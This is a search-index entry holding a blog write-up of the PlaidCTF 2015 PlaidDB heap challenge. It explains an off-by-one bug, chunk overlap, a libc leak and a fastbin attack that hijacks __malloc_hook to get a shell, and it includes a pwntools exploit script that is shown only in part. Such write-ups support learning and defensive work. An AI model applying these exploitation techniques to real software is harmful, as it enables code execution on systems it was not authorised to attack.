<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>【plaidctf 2015】PlaidDB</title>
      <link href="/posts/14f0dc5a.html"/>
      <url>/posts/14f0dc5a.html</url>
      
        <content type="html"><![CDATA[<h1 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h1><ul><li>利用 off-by-one 漏洞造成 Chunk Overlap，通过对堆的布局利用 <code>unsorted bin</code> 修改已有 <code>chunk</code> 内容为 <code>bk</code> 指针，泄露 libc 地址，并利用 fast bin attack，错位伪造 <code>chunk</code>，劫持 <code>__malloc_hook</code> 为 one_gadget 来 getshell</li></ul><hr><p><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/off_by_one/2015_plaidctf_datastore">【plaidctf 2015】PlaidDB</a></p><hr><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><blockquote><p>本地环境：Glibc 2.23</p></blockquote><p>查看保护，64 位保护全开：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb1.png" alt="【plaidctf 2015】plaiddb1.png"></p><p>尝试运行：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb2.png" alt="【plaidctf 2015】plaiddb2.png"></p><p>IDA 下分析：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb3.png" alt="【plaidctf 2015】plaiddb3.png"></p><p>程序最开始会初始化三个堆，经过后面的分析可以知道，第一个堆存放的是结构体，主要使用了二叉树的结构来存储数据：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">struct</span> <span class="token class-name">Node</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>key<span class="token punctuation">;</span>    <span class="token keyword">long</span> data_size<span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">Node</span> <span class="token operator">*</span>left<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">Node</span> <span class="token operator">*</span>right<span class="token punctuation">;</span>    <span class="token keyword">long</span> dummy<span class="token punctuation">;</span>    <span class="token keyword">long</span> dummy1<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>不过关于树的结构我没太看懂。。。网上说是红黑树？我只知道前三个指针，但是二叉树各节点之间的关系是怎么来的不太明白</p></blockquote><p>其初始化 <code>row_key</code> 为 <code>th3fl4g</code>，初始化 <code>data</code> 为 <code>youwish</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb11.png" alt="【plaidctf 2015】plaiddb11.png"></p><p>程序运行时 <code>PROMPT: Enter command:</code> 是在 <code>sub_1A20()</code> 函数中定义的，有 <code>GET</code>、<code>PUT</code>、<code>DUMP</code>、<code>DEL</code>、<code>EXIT</code> 这几种命令：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb4.png" alt="【plaidctf 2015】plaiddb4.png"></p><p><code>GET</code> 功能：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb5.png" alt="【plaidctf 2015】plaiddb5.png"></p><p>首先通过 <code>sub_1040()</code> 函数读取 <code>row_key</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb6.png" alt="【plaidctf 2015】plaiddb6.png"></p><p>首先 <code>malloc(8)</code> 来存放 <code>row_key</code> ，如果空间大小不够，再 <code>realloc()</code></p><blockquote><p>仔细观察可以发现 <code>sub_1040()</code> 函数这个输入存在 off-by-null 漏洞，如果将数据写满，该函数会溢出 1 字节，并将其置为 NULL</p></blockquote><p><code>PUT</code> 功能：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb7.png" alt="【plaidctf 2015】plaiddb7.png"></p><p>主要是输入一些数据，首先 <code>malloc(0x38)</code> 申请了一个堆块用于存放结构体</p><p>同样使用了 <code>sub_1040()</code> 函数来读取 <code>row_key</code>，并申请了第二个堆块，指针存放在 <code>*v0</code></p><p>然后 <code>malloc(v1)</code> 申请了第三个堆块，读入 <code>size</code> 大小的数据 <code>data</code></p><p>通过调试来验证一下，执行 <code>PUT(1, 2, b&#39;a&#39;)</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb9.png" alt="【plaidctf 2015】plaiddb9.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb10.png" alt="【plaidctf 2015】plaiddb10.png"></p><p><code>DEL</code> 功能：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb16.png" alt="【plaidctf 2015】plaiddb16.png"></p><p>这个函数实现的是删除功能，由于是二叉树结构，这个函数比较复杂，只需要知道是按照 <code>row_key</code> 来进行删除的就行，<code>row_key</code> 通过 <code>sub_1040()</code> 函数读取，依然是存在 off-by-one 漏洞的</p><p>现在根据以上分析，结合程序运行，可以大致知道该程序的功能了：</p><ul><li><code>PUT</code> 插入数据，包括 <code>row_key</code>、<code>data_size</code>、<code>data</code>  </li><li><code>GET</code> 打印 <code>row_key</code> 对应的 <code>data</code>  </li><li><code>DUMP</code> 打印所有 <code>row_key</code>  </li><li><code>DEL</code> 删除 <code>row_key</code> 对应的数据</li></ul><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb8.png" alt="【plaidctf 2015】plaiddb8.png"></p><p>虽然输入 <code>row_key</code> 时存在 off-by-one 漏洞，但特殊在于，其使用了 <code>realloc()</code> 使分配的大小通过可用空间大小乘二的方式增大</p><p>也就是说想要触发这个漏洞，对于分配的大小有要求，满足该要求的大小有：<code>0x18</code>、<code>0x38</code>、<code>0x78</code>、<code>0xf8</code>、<code>0x1f8</code> 等</p><blockquote><p>通过 off-by-one 漏洞溢出后，可以造成 Chunk Overlap，并泄露 libc 地址，且可以形成 UAF，对于 UAF 漏洞首选 fast bin attack 的方法</p></blockquote><p>我们首先需要有一个处于释放状态的 <code>unsorted bin chunk</code> 或者 <code>small bin chunk</code>，然后在其下方还需要一个进行溢出的 <code>chunk</code> 和被溢出的 <code>chunk</code></p><p>然后利用 off-by-one 漏洞，使它们全都被合并为一个处于释放状态的 <code>chunk</code>，这样中间任意 <code>chunk</code> 的位置如果是已被分配的，就可以造成 Chunk Overlap</p><p>大致结构如下：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">|</span>            <span class="token operator">|</span>  <span class="token operator">&lt;</span><span class="token operator">--</span> free 的 unsorted bin 或是 small bin chunk （因为此时 fd 和 bk 指向合法指针，才能够进行 unlink）<span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">|</span>     <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token operator">|</span>  <span class="token operator">&lt;</span><span class="token operator">--</span> 任意 chunk<span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">|</span>            <span class="token operator">|</span>  <span class="token operator">&lt;</span><span class="token operator">--</span> 进行溢出的 chunk<span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">|</span>    vuln    <span class="token operator">|</span>  <span class="token operator">&lt;</span><span class="token operator">--</span> 被溢出的 chunk，大小为 <span class="token number">0</span>x_00 （例如 <span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token number">0x200</span>……）<span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结合 <code>sub_1040()</code> 函数通过 <code>malloc(8)</code> 再 <code>realloc()</code> 的分配方式，对于堆的布局有以下要求：</p><ol><li>任意 <code>chunk</code> 位置至少有一个已经被分配、且可以读出数据的 <code>chunk</code> 来泄露 <code>libc</code> 地址  </li><li>任意 <code>chunk</code> 位置至少还需要有一个已经被释放、且 <code>size</code> 为 <code>0x71</code> 的 <code>chunk</code> 来进行 <code>fast bin attack</code>  </li><li>进行溢出的 <code>chunk</code> 需要在最上方的 <code>chunk</code> 之前被分配，否则 <code>malloc(8)</code> 的时候会分配到最上方，而不是进行溢出 <code>chunk</code> 所在的下方的位置  </li><li>进行溢出的 <code>chunk</code> 大小应该属于 <code>unsorted bin</code> 或是 <code>small bin</code>，不能为 <code>fast bin</code>，否则被释放之后，按照 <code>sub_1040()</code> 函数的分配方式，<code>malloc(8)</code> 无法分配在该位置  </li><li>最下方应该有一个已经被分配的 <code>chunk</code> 来防止与 <code>top chunk</code> 合并</li></ol><p>按照上述要求，完整的堆结构应该如下：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">|</span>      chunk <span class="token number">1</span>     <span class="token operator">|</span>  <span class="token operator">&lt;</span><span class="token operator">--</span> free 的 size <span class="token operator">==</span> <span class="token number">0x200</span> chunk<span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">|</span>      chunk <span class="token number">2</span>     <span class="token operator">|</span>  <span class="token operator">&lt;</span><span class="token operator">--</span> size <span class="token operator">==</span> <span class="token number">0x60</span> fastbin chunk，已被分配，且可以读出数据<span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">|</span>      chunk <span class="token number">3</span>     <span class="token operator">|</span>  <span class="token operator">&lt;</span><span class="token operator">--</span> size <span class="token operator">==</span> <span class="token number">0x71</span> fastbin chunk，为 fastbin attack 做准备<span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">|</span>      chunk <span class="token number">4</span>     <span class="token operator">|</span>  <span class="token operator">&lt;</span><span class="token operator">--</span> size <span class="token operator">==</span> <span class="token number">0x1f8</span> free 状态的 small bin<span class="token operator">/</span>unsorted bin chunk<span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">|</span>      chunk <span class="token number">5</span>     <span class="token operator">|</span>  <span class="token operator">&lt;</span><span class="token operator">--</span> size <span class="token operator">==</span> <span class="token number">0x101</span> 被溢出 chunk<span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">|</span>         X        <span class="token operator">|</span>  <span class="token operator">&lt;</span><span class="token operator">--</span> 任意分配后 chunk 防止 top chunk 合并<span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由于分配过程中还存在一些额外结构，包括结构体本身的分配和 <code>sub_1040()</code> 函数，因此需要先释放出足够的 <code>fast bin chunk</code> 来避免结构体本身的分配对我们布置的对结构造成影响</p><p>这里通过先执行 10 次 <code>PUT()</code> 和 10 次 <code>DEL()</code> 来实现：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb12.png" alt="【plaidctf 2015】plaiddb12.png"></p><p>构造好我们需要的堆块后，分别 <code>free</code> 掉 <code>chunk 3</code>、<code>chunk 4</code> 和 <code>chunk 1</code></p><p><code>DEL(b&#39;3&#39;)</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb13.png" alt="【plaidctf 2015】plaiddb13.png"></p><p><code>DEL(b&#39;4&#39;)</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb14.png" alt="【plaidctf 2015】plaiddb14.png"></p><p><code>DEL(b&#39;1&#39;)</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb15.png" alt="【plaidctf 2015】plaiddb15.png"></p><p>这样就形成了我们所需要的堆结构</p><p>然后利用 <code>DEL()</code> 中 <code>sub_1040()</code> 函数读取 <code>row_key</code> 时的 off-by-one 漏洞，将 <code>chunk 4</code> 写满，并溢出覆盖 <code>chunk 5</code> 的 <code>prev_size</code> 域：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb18.png" alt="【plaidctf 2015】plaiddb18.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb17.png" alt="【plaidctf 2015】plaiddb17.png"></p><p>这里覆盖的是 <code>0x4e0</code>，因为我们为了造成 Chunk Overlap，需要让这些 <code>chunk</code> 全部被合并为一个处于释放状态的 <code>chunk</code></p><p>因此 <code>chunk 5</code> 的 <code>prev_size</code> 域需要修改为前几个 <code>chunk</code> 的大小之和，即：<code>0x4e0 = 0x200 + 0x50 + 0x68 + 0x1f8 + 0x30</code></p><p>然后 <code>free</code> 掉 <code>chunk 5</code>，这些 <code>chunk</code> 将会被合并成一个 <code>unsorted bin</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb19.png" alt="【plaidctf 2015】plaiddb19.png"></p><p>由于此时还存在一个 <code>0x360</code> 的 <code>small bin</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb20.png" alt="【plaidctf 2015】plaiddb20.png"></p><p>为了防止干扰，需要先通过 <code>PUT(b&#39;0x200&#39;, 0x200, b&#39;fillup&#39;)</code> 将其分配掉：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb21.png" alt="【plaidctf 2015】plaiddb21.png"></p><p>此时合并的 <code>chunk</code> 被置于 <code>large bin</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb22.png" alt="【plaidctf 2015】plaiddb22.png"></p><blockquote><p>为了泄露 libc 基地址，我们可以利用 <code>unsorted bin</code> 的特性，打印其 <code>bk</code> 指针</p><p>首先，我们需要利用此时 <code>chunk 2</code> 与合并的 <code>chunk</code> 重叠的特点，利用 <code>unsorted bin</code> 来修改 <code>chunk 2</code> 的指针</p></blockquote><p>因此，我们先通过 <code>PUT(b&#39;0x200 fillup&#39;, 0x200, b&#39;fillup again&#39;)</code> 从 <code>large bin</code> 中将之前的 <code>chunk 1</code> 的空间分配掉：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb23.png" alt="【plaidctf 2015】plaiddb23.png"></p><p>此时 <code>chunk 2</code> 处于 <code>unsorted bin</code> 的第一个位置，其指针已被 <code>unsorted bin</code> 修改</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb24.png" alt="【plaidctf 2015】plaiddb24.png"></p><p>于是我们只需 <code>GET(b&#39;2&#39;)</code> 就可以在 <code>data_size</code> 输出的位置输出 <code>bk</code> 指针：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb25.png" alt="【plaidctf 2015】plaiddb25.png"></p><p><code>bk</code> 指针指向 <code>main_arena + 88</code> 的位置，根据 <code>main_arena</code> 与 <code>__malloc_hook</code> 存在固定偏移 <code>0x10</code>，利用 <code>__malloc_hook</code> 在 libc 中的偏移即可得到 libc 基地址：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb26.png" alt="【plaidctf 2015】plaiddb26.png"></p><p>由于前面我们已经释放了 <code>chunk 1</code>、<code>chunk 3</code>、<code>chunk 4</code>，只剩 <code>chunk 2</code> 和 <code>chunk 5</code> 可以利用了，此时 <code>unsorted bin</code> 距离 <code>chunk 5</code> 正好 <code>0x5586e425b950 - 0x5586e425b900 = 0x50</code></p><p>于是填充 <code>0x58</code> 就可以修改 <code>chunk 5</code> 的 <code>size</code> 域和 <code>fd</code>，即可控制下一个 <code>fast bin</code> 的位置</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb27.png" alt="【plaidctf 2015】plaiddb27.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb28.png" alt="【plaidctf 2015】plaiddb28.png"></p><p>然后进行 fast bin attack：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb29.png" alt="【plaidctf 2015】plaiddb29.png"></p><p>劫持 <code>__malloc_hook</code> 为 one_gadget：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb30.png" alt="【plaidctf 2015】plaiddb30.png"></p><p>这样看得更清楚：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb31.png" alt="【plaidctf 2015】plaiddb31.png"></p><p>最后执行一次 <code>DEL()</code></p><p>利用 <code>sub_1040()</code> 函数中的 <code>malloc(8)</code> 触发 one_gadget 即可获得 shell</p><hr><h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment"># 设置系统架构, 打印调试信息</span><span class="token comment"># arch 可选 : i386 / amd64 / arm / mips</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span><span class="token comment"># PWN 远程 : content = 0, PWN 本地 : content = 1</span>content <span class="token operator">=</span> <span class="token number">1</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span> <span class="token comment"># ubuntu 16.04 Glibc 2.23</span><span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>    <span class="token comment"># 将本地的 Linux 程序启动为进程 io</span>    io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./datastore'</span><span class="token punctuation">)</span><span class="token comment"># 附加 gdb 调试</span><span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>cmd<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>  <span class="token comment"># 只有本地才可调试，远程无法调试</span>        gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span> cmd<span class="token punctuation">)</span>        pause<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">PUT</span><span class="token punctuation">(</span>row_key<span class="token punctuation">,</span> size<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'command:\n'</span><span class="token punctuation">,</span> <span class="token string">b'PUT'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'key:\n'</span><span class="token punctuation">,</span> row_key<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'size:\n'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">&lt;</span> size<span class="token punctuation">:</span>        data <span class="token operator">=</span> data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span>size<span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'data:\n'</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">DEL</span><span class="token punctuation">(</span>row_key<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'command:\n'</span><span class="token punctuation">,</span> <span class="token string">'DEL'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'key:\n'</span><span class="token punctuation">,</span> row_key<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">GET</span><span class="token punctuation">(</span>row_key<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'command:\n'</span><span class="token punctuation">,</span> <span class="token string">'GET'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'key:\n'</span><span class="token punctuation">,</span> row_key<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'['</span><span class="token punctuation">)</span>    num <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b' bytes'</span><span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token string">b' bytes'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':\n'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token comment"># 相关函数实现的时候用到了一些 0x38 大小的块，避免影响我们提前搞一些</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    PUT<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    DEL<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>PUT<span class="token punctuation">(</span><span class="token string">b'1'</span><span class="token punctuation">,</span> <span class="token number">0x200</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>   <span class="token comment"># 设置的大一些，后面分配的时候会优先将其分配出去，但分配的过大就不会物理相连了，实测绕不开后面的问题</span>PUT<span class="token punctuation">(</span><span class="token string">b'2'</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>    <span class="token comment"># 用来都 libc 的已分配块，表面上未分配，大小符合 fast bin 即可，暂未验证</span>PUT<span class="token punctuation">(</span><span class="token string">b'3'</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">b'3'</span><span class="token punctuation">)</span>    <span class="token comment"># 用来进行 fast bin attack 的块，大小应该符合 fast bin 即可，暂未验证</span>PUT<span class="token punctuation">(</span><span class="token string">b'4'</span><span class="token punctuation">,</span> <span class="token number">0x1f8</span><span class="token punctuation">,</span> <span class="token string">b'4'</span><span class="token punctuation">)</span>   <span class="token comment"># 用来溢出的块，溢出到下一个块的 pre_size 把他修改成上面全部块大小的和</span>PUT<span class="token punctuation">(</span><span class="token string">b'5'</span><span class="token punctuation">,</span> <span class="token number">0xf0</span><span class="token punctuation">,</span> <span class="token string">b'5'</span><span class="token punctuation">)</span>    <span class="token comment"># 用来被溢出的块</span>PUT<span class="token punctuation">(</span><span class="token string">b'defense'</span><span class="token punctuation">,</span> <span class="token number">0x400</span><span class="token punctuation">,</span> <span class="token string">b'defense-top chunk'</span><span class="token punctuation">)</span>   <span class="token comment"># 用来防止被 top chunk 合并</span>DEL<span class="token punctuation">(</span><span class="token string">b'3'</span><span class="token punctuation">)</span>DEL<span class="token punctuation">(</span><span class="token string">b'4'</span><span class="token punctuation">)</span>DEL<span class="token punctuation">(</span><span class="token string">b'1'</span><span class="token punctuation">)</span>DEL<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x1f0</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x4e0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment"># 溢出，0x4e0 = 0x200 + 0x50 + 0x68 + 0x1f8 + 0x30 (这是没有被使用的指针部分大小，三个)</span>DEL<span class="token punctuation">(</span><span class="token string">b'5'</span><span class="token punctuation">)</span>   <span class="token comment"># 合并 1 2 5 3 4 块</span>PUT<span class="token punctuation">(</span><span class="token string">b'0x200'</span><span class="token punctuation">,</span> <span class="token number">0x200</span><span class="token punctuation">,</span> <span class="token string">b'fillup'</span><span class="token punctuation">)</span>   <span class="token comment"># 这里是在 defense 块分配后导致清理碎片清理，多出来一个 0x360 的 small bin 要先把他分配掉</span>PUT<span class="token punctuation">(</span><span class="token string">b'0x200 fillup'</span><span class="token punctuation">,</span> <span class="token number">0x200</span><span class="token punctuation">,</span> <span class="token string">b'fillup again'</span><span class="token punctuation">)</span>   <span class="token comment"># 把 1 分配掉，这样 2 就是第一个块了，可以打印相关地址，泄漏 libc 基地址</span>libc_leak <span class="token operator">=</span> u64<span class="token punctuation">(</span>GET<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libc_leak: '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>libc_leak<span class="token punctuation">)</span><span class="token 